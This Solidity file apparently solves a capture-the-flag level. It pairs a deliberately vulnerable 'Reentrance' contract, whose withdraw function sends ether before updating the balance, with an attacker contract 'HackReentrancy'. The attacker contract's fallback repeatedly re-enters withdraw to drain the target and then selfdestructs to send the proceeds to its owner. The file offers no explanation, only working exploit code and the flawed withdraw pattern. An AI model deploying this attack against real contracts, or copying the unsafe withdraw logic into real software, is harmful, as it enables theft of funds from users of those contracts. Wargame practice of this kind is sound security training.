// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract HackReentrancy{

    Reentrance targetContract;
    address payable public owner;
    constructor(address _targetContract) public payable{
        owner = payable(msg.sender);
        address payable targetAddress = payable(_targetContract);
        targetContract=Reentrance(targetAddress);
        targetContract.donate{value:msg.value}(address(this));
    }

    function attack() public payable {
        targetContract.withdraw(msg.value);
    }
   
    fallback() external payable {
        if (address(targetContract).balance>=msg.value){
        targetContract.withdraw(msg.value);
        }
        else if (address(targetContract).balance>0){
            targetContract.withdraw(address(targetContract).balance);
        }
    }
    
    function kill() external {
        require(msg.sender == owner);
        selfdestruct(owner);
    }
}